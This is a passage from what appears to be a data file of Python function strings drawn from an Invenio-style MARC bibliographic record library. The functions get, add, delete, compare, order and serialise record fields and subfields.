reg_exp = re.compile(filter_value)\n        for instance in field_instances:\n            for subfield in instance[0]:\n                if subfield[0] == filter_subcode and \\\n                   reg_exp.match(subfield[1]) is not None:\n                    matched.append(instance)\n                    break\n    return matched"
        ],
        [
            "def record_drop_duplicate_fields(record):\n    \"\"\"\n    Return a record where all the duplicate fields have been removed.\n\n    Fields are considered identical considering also the order of their\n    subfields.\n    \"\"\"\n    out = {}\n    position = 0\n    tags = sorted(record.keys())\n    for tag in tags:\n        fields = record[tag]\n        out[tag] = []\n        current_fields = set()\n        for full_field in fields:\n            field = (tuple(full_field[0]),) + full_field[1:4]\n            if field not in current_fields:\n                current_fields.add(field)\n                position += 1\n                out[tag].append(full_field[:4] + (position,))\n    return out"
        ],
        [
            "def records_identical(rec1, rec2, skip_005=True, ignore_field_order=False,\n                      ignore_subfield_order=False,\n                      ignore_duplicate_subfields=False,\n                      ignore_duplicate_controlfields=False):\n    \"\"\"\n    Return True if rec1 is identical to rec2.\n\n    It does so regardless of a difference in the 005 tag (i.e. the timestamp).\n    \"\"\"\n    rec1_keys = set(rec1.keys())\n    rec2_keys = set(rec2.keys())\n    if skip_005:\n        rec1_keys.discard(\"005\")\n        rec2_keys.discard(\"005\")\n    if rec1_keys != rec2_keys:\n        return False\n    for key in rec1_keys:\n        if ignore_duplicate_controlfields and key.startswith('00'):\n            if set(field[3] for field in rec1[key]) != \\\n                    set(field[3] for field in rec2[key]):\n                return False\n            continue\n\n        rec1_fields = rec1[key]\n        rec2_fields = rec2[key]\n        if len(rec1_fields) != len(rec2_fields):\n            # They already differs in length...\n            return False\n        if ignore_field_order:\n            # We sort the fields, first by indicators and then by anything else\n            rec1_fields = sorted(\n                rec1_fields,\n                key=lambda elem: (elem[1], elem[2], elem[3], elem[0]))\n            rec2_fields = sorted(\n                rec2_fields,\n                key=lambda elem: (elem[1], elem[2], elem[3], elem[0]))\n        else:\n            # We sort the fields, first by indicators, then by global position\n            # and then by anything else\n            rec1_fields = sorted(\n                rec1_fields,\n                key=lambda elem: (elem[1], elem[2], elem[4], elem[3], elem[0]))\n            rec2_fields = sorted(\n                rec2_fields,\n                key=lambda elem: (elem[1], elem[2], elem[4], elem[3], elem[0]))\n        for field1, field2 in zip(rec1_fields, rec2_fields):\n            if ignore_duplicate_subfields:\n                if field1[1:4] != field2[1:4] or \\\n                        set(field1[0]) != set(field2[0]):\n                    return False\n            elif ignore_subfield_order:\n                if field1[1:4] != field2[1:4] or \\\n                        sorted(field1[0]) != sorted(field2[0]):\n                    return False\n            elif field1[:4] != field2[:4]:\n                return False\n    return True"
        ],
        [
            "def record_get_field_instances(rec, tag=\"\", ind1=\" \", ind2=\" \"):\n    \"\"\"\n    Return the list of field instances for the specified tag and indications.\n\n    Return empty list if not found.\n    If tag is empty string, returns all fields\n\n    Parameters (tag, ind1, ind2) can contain wildcard %.\n\n    :param rec: a record structure as returned by create_record()\n    :param tag: a 3 characters long string\n    :param ind1: a 1 character long string\n    :param ind2: a 1 character long string\n    :param code: a 1 character long string\n    :return: a list of field tuples (Subfields, ind1, ind2, value,\n             field_position_global) where subfields is list of (code, value)\n    \"\"\"\n    if not rec:\n        return []\n    if not tag:\n        return rec.items()\n    else:\n        out = []\n        ind1, ind2 = _wash_indicators(ind1, ind2)\n\n        if '%' in tag:\n            # Wildcard in tag. Check all possible\n            for field_tag in rec:\n                if _tag_matches_pattern(field_tag, tag):\n                    for possible_field_instance in rec[field_tag]:\n                        if (ind1 in ('%', possible_field_instance[1]) and\n                                ind2 in ('%', possible_field_instance[2])):\n                            out.append(possible_field_instance)\n        else:\n            # Completely defined tag. Use dict\n            for possible_field_instance in rec.get(tag, []):\n                if (ind1 in ('%', possible_field_instance[1]) and\n                        ind2 in ('%', possible_field_instance[2])):\n                    out.append(possible_field_instance)\n        return out"
        ],
        [
            "def record_delete_field(rec, tag, ind1=' ', ind2=' ',\n                        field_position_global=None, field_position_local=None):\n    \"\"\"\n    Delete the field with the given position.\n\n    If global field position is specified, deletes the field with the\n    corresponding global field position.\n    If field_position_local is specified, deletes the field with the\n    corresponding local field position and tag.\n    Else deletes all the fields matching tag and optionally ind1 and\n    ind2.\n\n    If both field_position_global and field_position_local are present,\n    then field_position_local takes precedence.\n\n    :param rec: the record data structure\n    :param tag: the tag of the field to be deleted\n    :param ind1: the first indicator of the field to be deleted\n    :param ind2: the second indicator of the field to be deleted\n    :param field_position_global: the global field position (record wise)\n    :param field_position_local: the local field position (tag wise)\n    :return: the list of deleted fields\n    \"\"\"\n    error = _validate_record_field_positions_global(rec)\n    if error:\n        # FIXME one should write a message here.\n        pass\n\n    if tag not in rec:\n        return False\n\n    ind1, ind2 = _wash_indicators(ind1, ind2)\n\n    deleted = []\n    newfields = []\n\n    if field_position_global is None and field_position_local is None:\n        # Remove all fields with tag 'tag'.\n        for field in rec[tag]:\n            if field[1] != ind1 or field[2] != ind2:\n                newfields.append(field)\n            else:\n                deleted.append(field)\n        rec[tag] = newfields\n    elif field_position_global is not None:\n        # Remove the field with 'field_position_global'.\n        for field in rec[tag]:\n            if (field[1] != ind1 and field[2] != ind2 or\n                    field[4] != field_position_global):\n                newfields.append(field)\n            else:\n                deleted.append(field)\n        rec[tag] = newfields\n    elif field_position_local is not None:\n        # Remove the field with 'field_position_local'.\n        try:\n            del rec[tag][field_position_local]\n        except IndexError:\n            return []\n\n    if not rec[tag]:\n        # Tag is now empty, remove it.\n        del rec[tag]\n\n    return deleted"
        ],
        [
            "def record_add_fields(rec, tag, fields, field_position_local=None,\n                      field_position_global=None):\n    \"\"\"\n    Add the fields into the record at the required position.\n\n    The position is specified by the tag and the field_position_local in the\n    list of fields.\n\n    :param rec: a record structure\n    :param tag: the tag of the fields to be moved\n    :param field_position_local: the field_position_local to which the field\n                                 will be inserted. If not specified, appends\n                                 the fields to the tag.\n    :param a: list of fields to be added\n    :return: -1 if the operation failed, or the field_position_local if it was\n             successful\n    \"\"\"\n    if field_position_local is None and field_position_global is None:\n        for field in fields:\n            record_add_field(\n                rec, tag, ind1=field[1],\n                ind2=field[2], subfields=field[0],\n                controlfield_value=field[3])\n    else:\n        fields.reverse()\n        for field in fields:\n            record_add_field(\n                rec, tag, ind1=field[1], ind2=field[2],\n                subfields=field[0], controlfield_value=field[3],\n                field_position_local=field_position_local,\n                field_position_global=field_position_global)\n\n    return field_position_local"
        ],
        [
            "def record_move_fields(rec, tag, field_positions_local,\n                       field_position_local=None):\n    \"\"\"\n    Move some fields to the position specified by 'field_position_local'.\n\n    :param rec: a record structure as returned by create_record()\n    :param tag: the tag of the fields to be moved\n    :param field_positions_local: the positions of the fields to move\n    :param field_position_local: insert the field before that\n                                 field_position_local. If unspecified, appends\n                                 the fields :return: the field_position_local\n                                 is the operation was successful\n    \"\"\"\n    fields = record_delete_fields(\n        rec, tag,\n        field_positions_local=field_positions_local)\n    return record_add_fields(\n        rec, tag, fields,\n        field_position_local=field_position_local)"
        ],
        [
            "def record_delete_subfield(rec, tag, subfield_code, ind1=' ', ind2=' '):\n    \"\"\"Delete all subfields with subfield_code in the record.\"\"\"\n    ind1, ind2 = _wash_indicators(ind1, ind2)\n\n    for field in rec.get(tag, []):\n        if field[1] == ind1 and field[2] == ind2:\n            field[0][:] = [subfield for subfield in field[0]\n                           if subfield_code != subfield[0]]"
        ],
        [
            "def record_get_field(rec, tag, field_position_global=None,\n                     field_position_local=None):\n    \"\"\"\n    Return the the matching field.\n\n    One has to enter either a global field position or a local field position.\n\n    :return: a list of subfield tuples (subfield code, value).\n    :rtype: list\n    \"\"\"\n    if field_position_global is None and field_position_local is None:\n        raise InvenioBibRecordFieldError(\n            \"A field position is required to \"\n            \"complete this operation.\")\n    elif field_position_global is not None and \\\n            field_position_local is not None:\n        raise InvenioBibRecordFieldError(\n            \"Only one field position is required \"\n            \"to complete this operation.\")\n    elif field_position_global:\n        if tag not in rec:\n            raise InvenioBibRecordFieldError(\"No tag '%s' in record.\" % tag)\n\n        for field in rec[tag]:\n            if field[4] == field_position_global:\n                return field\n        raise InvenioBibRecordFieldError(\n            \"No field has the tag '%s' and the \"\n            \"global field position '%d'.\" % (tag, field_position_global))\n    else:\n        try:\n            return rec[tag][field_position_local]\n        except KeyError:\n            raise InvenioBibRecordFieldError(\"No tag '%s' in record.\" % tag)\n        except IndexError:\n            raise InvenioBibRecordFieldError(\n                \"No field has the tag '%s' and \"\n                \"the local field position '%d'.\" % (tag, field_position_local))"
        ],
        [
            "def record_replace_field(rec, tag, new_field, field_position_global=None,\n                         field_position_local=None):\n    \"\"\"Replace a field with a new field.\"\"\"\n    if field_position_global is None and field_position_local is None:\n        raise InvenioBibRecordFieldError(\n            \"A field position is required to \"\n            \"complete this operation.\")\n    elif field_position_global is not None and \\\n            field_position_local is not None:\n        raise InvenioBibRecordFieldError(\n            \"Only one field position is required \"\n            \"to complete this operation.\")\n    elif field_position_global:\n        if tag not in rec:\n            raise InvenioBibRecordFieldError(\"No tag '%s' in record.\" % tag)\n\n        replaced = False\n        for position, field in enumerate(rec[tag]):\n            if field[4] == field_position_global:\n                rec[tag][position] = new_field\n                replaced = True\n\n        if not replaced:\n            raise InvenioBibRecordFieldError(\n                \"No field has the tag '%s' and \"\n                \"the global field position '%d'.\" %\n                (tag, field_position_global))\n    else:\n        try:\n            rec[tag][field_position_local] = new_field\n        except KeyError:\n            raise InvenioBibRecordFieldError(\"No tag '%s' in record.\" % tag)\n        except IndexError:\n            raise InvenioBibRecordFieldError(\n                \"No field has the tag '%s' and \"\n                \"the local field position '%d'.\" % (tag, field_position_local))"
        ],
        [
            "def record_get_subfields(rec, tag, field_position_global=None,\n                         field_position_local=None):\n    \"\"\"\n    Return the subfield of the matching field.\n\n    One has to enter either a global field position or a local field position.\n\n    :return: a list of subfield tuples (subfield code, value).\n    :rtype:  list\n    \"\"\"\n    field = record_get_field(\n        rec, tag,\n        field_position_global=field_position_global,\n        field_position_local=field_position_local)\n\n    return field[0]"
        ],
        [
            "def record_delete_subfield_from(rec, tag, subfield_position,\n                                field_position_global=None,\n                                field_position_local=None):\n    \"\"\"\n    Delete subfield from position specified.\n\n    Specify the subfield by tag, field number and subfield position.\n    \"\"\"\n    subfields = record_get_subfields(\n        rec, tag,\n        field_position_global=field_position_global,\n        field_position_local=field_position_local)\n\n    try:\n        del subfields[subfield_position]\n    except IndexError:\n        raise InvenioBibRecordFieldError(\n            \"The record does not contain the subfield \"\n            \"'%(subfieldIndex)s' inside the field (local: \"\n            \"'%(fieldIndexLocal)s, global: '%(fieldIndexGlobal)s' ) of tag \"\n            \"'%(tag)s'.\" %\n            {\"subfieldIndex\": subfield_position,\n             \"fieldIndexLocal\": str(field_position_local),\n             \"fieldIndexGlobal\": str(field_position_global),\n             \"tag\": tag})\n    if not subfields:\n        if field_position_global is not None:\n            for position, field in enumerate(rec[tag]):\n                if field[4] == field_position_global:\n                    del rec[tag][position]\n        else:\n            del rec[tag][field_position_local]\n\n        if not rec[tag]:\n            del rec[tag]"
        ],
        [
            "def record_add_subfield_into(rec, tag, subfield_code, value,\n                             subfield_position=None,\n                             field_position_global=None,\n                             field_position_local=None):\n    \"\"\"Add subfield into specified position.\n\n    Specify the subfield by tag, field number and optionally by subfield\n    position.\n    \"\"\"\n    subfields = record_get_subfields(\n        rec, tag,\n        field_position_global=field_position_global,\n        field_position_local=field_position_local)\n\n    if subfield_position is None:\n        subfields.append((subfield_code, value))\n    else:\n        subfields.insert(subfield_position, (subfield_code, value))"
        ],
        [
            "def record_modify_controlfield(rec, tag, controlfield_value,\n                               field_position_global=None,\n                               field_position_local=None):\n    \"\"\"Modify controlfield at position specified by tag and field number.\"\"\"\n    field = record_get_field(\n        rec, tag,\n        field_position_global=field_position_global,\n        field_position_local=field_position_local)\n\n    new_field = (field[0], field[1], field[2], controlfield_value, field[4])\n\n    record_replace_field(\n        rec, tag, new_field,\n        field_position_global=field_position_global,\n        field_position_local=field_position_local)"
        ],
        [
            "def record_modify_subfield(rec, tag, subfield_code, value, subfield_position,\n                           field_position_global=None,\n                           field_position_local=None):\n    \"\"\"Modify subfield at specified position.\n\n    Specify the subfield by tag, field number and subfield position.\n    \"\"\"\n    subfields = record_get_subfields(\n        rec, tag,\n        field_position_global=field_position_global,\n        field_position_local=field_position_local)\n\n    try:\n        subfields[subfield_position] = (subfield_code, value)\n    except IndexError:\n        raise InvenioBibRecordFieldError(\n            \"There is no subfield with position '%d'.\" % subfield_position)"
        ],
        [
            "def record_move_subfield(rec, tag, subfield_position, new_subfield_position,\n                         field_position_global=None,\n                         field_position_local=None):\n    \"\"\"Move subfield at specified position.\n\n    Sspecify the subfield by tag, field number and subfield position to new\n    subfield position.\n    \"\"\"\n    subfields = record_get_subfields(\n        rec,\n        tag,\n        field_position_global=field_position_global,\n        field_position_local=field_position_local)\n\n    try:\n        subfield = subfields.pop(subfield_position)\n        subfields.insert(new_subfield_position, subfield)\n    except IndexError:\n        raise InvenioBibRecordFieldError(\n            \"There is no subfield with position '%d'.\" % subfield_position)"
        ],
        [
            "def record_xml_output(rec, tags=None, order_fn=None):\n    \"\"\"Generate the XML for record 'rec'.\n\n    :param rec: record\n    :param tags: list of tags to be printed\n    :return: string\n    \"\"\"\n    if tags is None:\n        tags = []\n    if isinstance(tags, str):\n        tags = [tags]\n    if tags and '001' not in tags:\n        # Add the missing controlfield.\n        tags.append('001')\n\n    marcxml = ['<record>']\n\n    # Add the tag 'tag' to each field in rec[tag]\n    fields = []\n    if rec is not None:\n        for tag in rec:\n            if not tags or tag in tags:\n                for field in rec[tag]:\n                    fields.append((tag, field))\n        if order_fn is None:\n            record_order_fields(fields)\n        else:\n            record_order_fields(fields, order_fn)\n        for field in fields:\n            marcxml.append(field_xml_output(field[1], field[0]))\n    marcxml.append('</record>')\n    return '\\n'.join(marcxml)"
        ],
        [
            "def field_xml_output(field, tag):\n    \"\"\"Generate the XML for field 'field' and returns it as a string.\"\"\"\n    marcxml = []\n    if field[3]:\n        marcxml.append('  <controlfield tag=\"%s\">%s</controlfield>' %\n                       (tag, MathMLParser.html_to_text(field[3])))\n    else:\n        marcxml.append('  <datafield tag=\"%s\" ind1=\"%s\" ind2=\"%s\">' %\n                       (tag, field[1], field[2]))\n        marcxml += [_subfield_xml_output(subfield) for subfield in field[0]]\n        marcxml.append('  </datafield>')\n    return '\\n'.join(marcxml)"
        ],
        [
            "def print_rec(rec, format=1, tags=None):\n    \"\"\"\n    Print a record.\n\n    :param format: 1 XML, 2 HTML (not implemented)\n    :param tags: list of tags to be printed\n    \"\"\"\n    if tags is None:\n        tags = []\n    if format == 1:\n        text = record_xml_output(rec, tags)\n    else:\n        return ''\n\n    return text"
        ],
        [
            "def print_recs(listofrec, format=1, tags=None):\n    \"\"\"\n    Print a list of records.\n\n    :param format: 1 XML, 2 HTML (not implemented)\n    :param tags: list of tags to be printed\n           if 'listofrec' is not a list it returns empty string\n    \"\"\"\n    if tags is None:\n        tags = []\n    text = \"\"\n\n    if type(listofrec).__name__ != 'list':\n        return \"\"\n    else:\n        for rec in listofrec:\n            text = \"%s\\n%s\" % (text, print_rec(rec, format, tags))\n    return text"
        ],
        [
            "def record_find_field(rec, tag, field, strict=False):\n    \"\"\"\n    Return the global and local positions of the first occurrence of the field.\n\n    :param rec:    A record dictionary structure\n    :type  rec:    dictionary\n    :param tag:    The tag of the field to search for\n    :type  tag:    string\n    :param field:  A field tuple as returned by create_field()\n    :type  field:  tuple\n    :param strict: A boolean describing the search method. If strict\n                   is False, then the order of the subfields doesn't\n                   matter. Default search method is strict.\n    :type  strict: boolean\n    :return:       A tuple of (global_position, local_position) or a\n                   tuple (None, None) if the field is not present.\n    :rtype:        tuple\n    :raise InvenioBibRecordFieldError: If the provided field is invalid.\n    \"\"\"\n    try:\n        _check_field_validity(field)\n    except InvenioBibRecordFieldError:\n        raise\n\n    for local_position, field1 in enumerate(rec.get(tag, [])):\n        if _compare_fields(field, field1, strict):\n            return (field1[4], local_position)\n\n    return (None, None)"
        ],
        [
            "def record_match_subfields(rec, tag, ind1=\" \", ind2=\" \", sub_key=None,\n                           sub_value='', sub_key2=None, sub_value2='',\n                           case_sensitive=True):\n    \"\"\"\n    Find subfield instances in a particular field.\n\n    It tests values in 1 of 3 possible ways:\n     - Does a subfield code exist? (ie does 773__a exist?)\n     - Does a subfield have a particular value? (ie 773__a == 'PhysX')\n     - Do a pair of subfields have particular values?\n        (ie 035__2 == 'CDS' and 035__a == '123456')\n\n    Parameters:\n     * rec - dictionary: a bibrecord structure\n     * tag - string: the tag of the field (ie '773')\n     * ind1, ind2 - char: a single characters for the MARC indicators\n     * sub_key - char: subfield key to find\n     * sub_value - string: subfield value of that key\n     * sub_key2 - char: key of subfield to compare against\n     * sub_value2 - string: expected value of second subfield\n     * case_sensitive - bool: be case sensitive when matching values\n\n    :return: false if no match found, else provides the field position (int)\n    \"\"\"\n    if sub_key is None:\n        raise TypeError(\"None object passed for parameter sub_key.\")\n\n    if sub_key2 is not None and sub_value2 is '':\n        raise TypeError(\"Parameter sub_key2 defined but sub_value2 is None, \"\n                        + \"function requires a value for comparrison.\")\n    ind1, ind2 = _wash_indicators(ind1, ind2)\n\n    if not case_sensitive:\n        sub_value = sub_value.lower()\n        sub_value2 = sub_value2.lower()\n\n    for field in record_get_field_instances(rec, tag, ind1, ind2):\n        subfields = dict(field_get_subfield_instances(field))\n        if not case_sensitive:\n            for k, v in subfields.iteritems():\n                subfields[k] = v.lower()\n\n        if sub_key in subfields:\n            if sub_value is '':\n                return field[4]\n            else:\n                if sub_value == subfields[sub_key]:\n                    if sub_key2 is None:\n                        return field[4]\n                    else:\n                        if sub_key2 in subfields:\n                            if sub_value2 == subfields[sub_key2]:\n                                return field[4]\n    return False"
        ],
        [
            "def record_strip_empty_volatile_subfields(rec):\n    \"\"\"Remove unchanged volatile subfields from the record.\"\"\"\n    for tag in rec.keys():\n        for field in rec[tag]:\n            field[0][:] = [subfield for subfield in field[0]\n                           if subfield[1][:9] != \"VOLATILE:\"]"
        ],
        [
            "def record_make_all_subfields_volatile(rec):\n    \"\"\"\n    Turns all subfields to volatile\n    \"\"\"\n    for tag in rec.keys():\n        for field_position, field in enumerate(rec[tag]):\n            for subfield_position, subfield in enumerate(field[0]):\n                if subfield[1][:9] != \"VOLATILE:\":\n                    record_modify_subfield(rec, tag, subfield[0], \"VOLATILE:\" + subfield[1],\n                        subfield_position, field_position_local=field_position)"
        ],
        [
            "def record_strip_empty_fields(rec, tag=None):\n    \"\"\"\n    Remove empty subfields and fields from the record.\n\n    If 'tag' is not None, only a specific tag of the record will be stripped,\n    otherwise the whole record.\n\n    :param rec:  A record dictionary structure\n    :type  rec:  dictionary\n    :param tag:  The tag of the field to strip empty fields from\n    :type  tag:  string\n    \"\"\"\n    # Check whole record\n    if tag is None:\n        tags = rec.keys()\n        for tag in tags:\n            record_strip_empty_fields(rec, tag)\n\n    # Check specific tag of the record\n    elif tag in rec:\n        # in case of a controlfield\n        if tag[:2] == '00':\n            if len(rec[tag]) == 0 or not rec[tag][0][3]:\n                del rec[tag]\n\n        #in case of a normal field\n        else:\n            fields = []\n            for field in rec[tag]:\n                subfields = []\n                for subfield in field[0]:\n                    # check if the subfield has been given a value\n                    if subfield[1]:\n                        # Always strip values\n                        subfield = (subfield[0], subfield[1].strip())\n                        subfields.append(subfield)\n                if len(subfields) > 0:\n                    new_field = create_field(subfields, field[1], field[2],\n                                             field[3])\n                    fields.append(new_field)\n            if len(fields) > 0:\n                rec[tag] = fields\n            else:\n                del rec[tag]"
        ],
        [
            "def record_strip_controlfields(rec):\n    \"\"\"\n    Remove all non-empty controlfields from the record.\n\n    :param rec:  A record dictionary structure\n    :type  rec:  dictionary\n    \"\"\"\n    for tag in rec.keys():\n        if tag[:2] == '00' and rec[tag][0][3]:\n            del rec[tag]"
        ],
        [
            "def record_order_subfields(rec, tag=None):\n    \"\"\"\n    Order subfields from a record alphabetically based on subfield code.\n\n    If 'tag' is not None, only a specific tag of the record will be reordered,\n    otherwise the whole record.\n\n    :param rec: bibrecord\n    :type rec: bibrec\n    :param tag: tag where the subfields will be ordered\n    :type tag: str\n    \"\"\"\n    if rec is None:\n        return rec\n    if tag is None:\n        tags = rec.keys()\n        for tag in tags:\n            record_order_subfields(rec, tag)\n    elif tag in rec:\n        for i in xrange(len(rec[tag])):\n            field = rec[tag][i]\n            # Order subfields alphabetically by subfield code\n            ordered_subfields = sorted(field[0],\n                                       key=lambda subfield: subfield[0])\n            rec[tag][i] = (ordered_subfields, field[1], field[2], field[3],\n                           field[4])"
        ],
        [
            "def _compare_fields(field1, field2, strict=True):\n    \"\"\"\n    Compare 2 fields.\n\n    If strict is True, then the order of the subfield will be taken care of, if\n    not then the order of the subfields doesn't matter.\n\n    :return: True if the field are equivalent, False otherwise.\n    \"\"\"\n    if strict:\n        # Return a simple equal test on the field minus the position.\n        return field1[:4] == field2[:4]\n    else:\n        if field1[1:4] != field2[1:4]:\n            # Different indicators or controlfield value.\n            return False\n        else:\n            # Compare subfields in a loose way.\n            return set(field1[0]) == set(field2[0])"
        ],
        [
            "def _check_field_validity(field):\n    \"\"\"\n    Check if a field is well-formed.\n\n    :param field: A field tuple as returned by create_field()\n    :type field:  tuple\n    :raise InvenioBibRecordFieldError: If the field is invalid.\n    \"\"\"\n    if type(field) not in (list, tuple):\n        raise InvenioBibRecordFieldError(\n            \"Field of type '%s' should be either \"\n            \"a list or a tuple.\" % type(field))\n\n    if len(field) != 5:\n        raise InvenioBibRecordFieldError(\n            \"Field of length '%d' should have 5 \"\n            \"elements.\" % len(field))\n\n    if type(field[0]) not in (list, tuple):\n        raise InvenioBibRecordFieldError(\n            \"Subfields of type '%s' should be \"\n            \"either a list or a tuple.\" % type(field[0]))\n\n    if type(field[1]) is not str:\n        raise InvenioBibRecordFieldError(\n            \"Indicator 1 of type '%s' should be \"\n            \"a string.\" % type(field[1]))\n\n    if type(field[2]) is not str:\n        raise InvenioBibRecordFieldError(\n            \"Indicator 2 of type '%s' should be \"\n            \"a string.\" % type(field[2]))\n\n    if type(field[3]) is not str:\n        raise InvenioBibRecordFieldError(\n            \"Controlfield value of type '%s' \"\n            \"should be a string.\" % type(field[3]))\n\n    if type(field[4]) is not int:\n        raise InvenioBibRecordFieldError(\n            \"Global position of type '%s' should \"\n            \"be an int.\" % type(field[4]))\n\n    for subfield in field[0]:\n        if (type(subfield) not in (list, tuple) or\n                len(subfield) != 2 or type(subfield[0]) is not str or\n                type(subfield[1]) is not str):\n            raise InvenioBibRecordFieldError(\n                \"Subfields are malformed. \"\n                \"Should a list of tuples of 2 strings.\")"
        ],
        [
            "def _shift_field_positions_global(record, start, delta=1):\n    \"\"\"\n    Shift all global field positions.\n\n    Shift all global field positions with global field positions\n    higher or equal to 'start' from the value 'delta'.\n    \"\"\"\n    if not delta:\n        return\n\n    for tag, fields in record.items():\n        newfields = []\n        for field in fields:\n            if field[4] < start:\n                newfields.append(field)\n            else:\n                # Increment the global field position by delta.\n                newfields.append(tuple(list(field[:4]) + [field[4] + delta]))\n        record[tag] = newfields"
        ],
        [
            "def _tag_matches_pattern(tag, pattern):\n    \"\"\"Return true if MARC 'tag' matches a 'pattern'.\n\n    'pattern' is plain text, with % as wildcard\n\n    Both parameters must be 3 characters long strings.\n\n    .. doctest::\n\n        >>> _tag_matches_pattern(\"909\", \"909\")\n        True\n        >>> _tag_matches_pattern(\"909\", \"9%9\")\n        True\n        >>> _tag_matches_pattern(\"909\", \"9%8\")\n        False\n\n    :param tag: a 3 characters long string\n    :param pattern: a 3 characters long string\n    :return: False or True\n    \"\"\"\n    for char1, char2 in zip(tag, pattern):\n        if char2 not in ('%', char1):\n            return False\n    return True"
        ],
        [
            "def _validate_record_field_positions_global(record):\n    \"\"\"\n    Check if the global field positions in the record are valid.\n\n    I.e., no duplicate global field positions and local field positions in the\n    list of fields are ascending.\n\n    :param record: the record data structure\n    :return: the first error found as a string or None if no error was found\n    \"\"\"\n    all_fields = []\n    for tag, fields in record.items():\n        previous_field_position_global = -1\n        for field in fields:\n            if field[4] < previous_field_position_global:\n                return (\"Non ascending global field positions in tag '%s'.\" %\n                        tag)\n            previous_field_position_global = field[4]\n            if field[4] in all_fields:\n                return (\"Duplicate global field position '%d' in tag '%s'\" %\n                        (field[4], tag))"
        ],
        [
            "def _record_sort_by_indicators(record):\n    \"\"\"Sort the fields inside the record by indicators.\"\"\"\n    for tag, fields in record.items():\n        record[tag] = _fields_sort_by_indicators(fields)"
        ],
        [
            "def _fields_sort_by_indicators(fields):\n    \"\"\"Sort a set of fields by their indicators.\n\n    Return a sorted list with correct global field positions.\n    \"\"\"\n    field_dict = {}\n    field_positions_global = []\n    for field in fields:\n        field_dict.setdefault(field[1:3], []).append(field)\n        field_positions_global.append(field[4])\n\n    indicators = field_dict.keys()\n    indicators.sort()\n\n    field_list = []\n    for indicator in indicators:\n        for field in field_dict[indicator]:\n            field_list.append(field[:4] + (field_positions_global.pop(0),))\n\n    return field_list"
        ],
        [
            "def _create_record_lxml(marcxml,\n                        verbose=CFG_BIBRECORD_DEFAULT_VERBOSE_LEVEL,\n                        correct=CFG_BIBRECORD_DEFAULT_CORRECT,\n                        keep_singletons=CFG_BIBRECORD_KEEP_SINGLETONS):\n    \"\"\"\n    Create a record object using the LXML parser.\n\n    If correct == 1, then perform DTD validation\n    If correct == 0, then do not perform DTD validation\n\n    If verbose == 0, the parser will not give warnings.\n    If 1 <= verbose <= 3, the parser will not give errors, but will warn\n        the user about possible mistakes (implement me!)\n    If verbose > 3 then the parser will be strict and will stop in case of\n        well-formedness errors or DTD errors.\n\n    \"\"\"\n    parser = etree.XMLParser(dtd_validation=correct,\n                             recover=(verbose <= 3))\n    if correct:\n        marcxml = '<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n' \\\n                  '<collection>\\n%s\\n</collection>' % (marcxml,)\n    try:\n        tree = etree.parse(StringIO(marcxml), parser)\n        # parser errors are located in parser.error_log\n        # if 1 <= verbose <=3 then show them to the user?\n        # if verbose == 0 then continue\n        # if verbose >3 then an exception will be thrown\n    except Exception as e:\n        raise InvenioBibRecordParserError(str(e))\n\n    record = {}\n    field_position_global = 0\n\n    controlfield_iterator = tree.iter(tag='{*}controlfield')\n    for controlfield in controlfield_iterator:\n        tag = controlfield.attrib.get('tag', '!').encode(\"UTF-8\")\n        ind1 = ' '\n        ind2 = ' '\n        text = controlfield.text\n        if text is None:\n            text = ''\n        else:\n            text = text.encode(\"UTF-8\")\n        subfields = []\n        if text or keep_singletons:\n            field_position_global += 1\n            record.setdefault(tag, []).append((subfields, ind1, ind2, text,\n                                               field_position_global))\n\n    datafield_iterator = tree.iter(tag='{*}datafield')\n    for datafield in datafield_iterator:\n        tag = datafield.attrib.get('tag', '!').encode(\"UTF-8\")\n        ind1 = datafield.attrib.get('ind1', '!').encode(\"UTF-8\")\n        ind2 = datafield.attrib.get('ind2', '!').encode(\"UTF-8\")\n        if ind1 in ('', '_'):\n            ind1 = ' '\n        if ind2 in ('', '_'):\n            ind2 = ' '\n        subfields = []\n        subfield_iterator = datafield.iter(tag='{*}subfield')\n        for subfield in subfield_iterator:\n            code = subfield.attrib.get('code', '!').encode(\"UTF-8\")\n            text = subfield.text\n            if text is None:\n                text = ''\n            else:\n                text = text.encode(\"UTF-8\")\n            if text or keep_singletons:\n                subfields.append((code, text))\n        if subfields or keep_singletons:\n            text = ''\n            field_position_global += 1\n            record.setdefault(tag, []).append((subfields, ind1, ind2, text,\n                                               field_position_global))\n\n    return record"
        ],
        [
            "def _get_children_by_tag_name(node, name):\n    \"\"\"Retrieve all children from node 'node' with name 'name'.\"\"\"\n    try:\n        return [child for child in node.childNodes if child.nodeName == name]\n    except TypeError:\n        return []"
        ],
        [
            "def _get_children_as_string(node):\n    \"\"\"Iterate through all the children of a node.\n\n    Returns one string containing the values from all the text-nodes\n    recursively.\n    \"\"\"\n    out = []\n    if node:\n        for child in node:\n            if child.nodeType == child.TEXT_NODE:\n                out.append(child.data)\n            else:\n                out.append(_get_children_as_string(child.childNodes))\n    return ''.join(out)"
        ],
        [
            "def _correct_record(record):\n    \"\"\"\n    Check and correct the structure of the record.\n\n    :param record: the record data structure\n    :return: a list of errors found\n    \"\"\"\n    errors = []\n\n    for tag in record.keys():\n        upper_bound = '999'\n        n = len(tag)\n\n        if n > 3:\n            i = n - 3\n            while i > 0:\n                upper_bound = '%s%s' % ('0', upper_bound)\n                i -= 1\n\n        # Missing tag. Replace it with dummy tag '000'.\n        if tag == '!':\n            errors.append((1, '(field number(s): ' +\n                              str([f[4] for f in record[tag]]) + ')'))\n            record['000'] = record.pop(tag)\n            tag = '000'\n        elif not ('001' <= tag <= upper_bound or\n                  tag in ('FMT', 'FFT', 'BDR', 'BDM')):\n            errors.append(2)\n            record['000'] = record.pop(tag)\n            tag = '000'\n\n        fields = []\n        for field in record[tag]:\n            # Datafield without any subfield.\n            if field[0] == [] and field[3] == '':\n                errors.append((8, '(field number: ' + str(field[4]) + ')'))\n\n            subfields = []\n            for subfield in field[0]:\n                if subfield[0] == '!':\n                    errors.append((3, '(field number: ' + str(field[4]) + ')'))\n                    newsub = ('', subfield[1])\n                else:\n                    newsub = subfield\n                subfields.append(newsub)\n\n            if field[1] == '!':\n                errors.append((4, '(field number: ' + str(field[4]) + ')'))\n                ind1 = \" \"\n            else:\n                ind1 = field[1]\n\n            if field[2] == '!':\n                errors.append((5, '(field number: ' + str(field[4]) + ')'))\n                ind2 = \" \"\n            else:\n                ind2 = field[2]\n\n            fields.append((subfields, ind1, ind2, field[3], field[4]))\n\n        record[tag] = fields\n\n    return errors"
        ],
        [
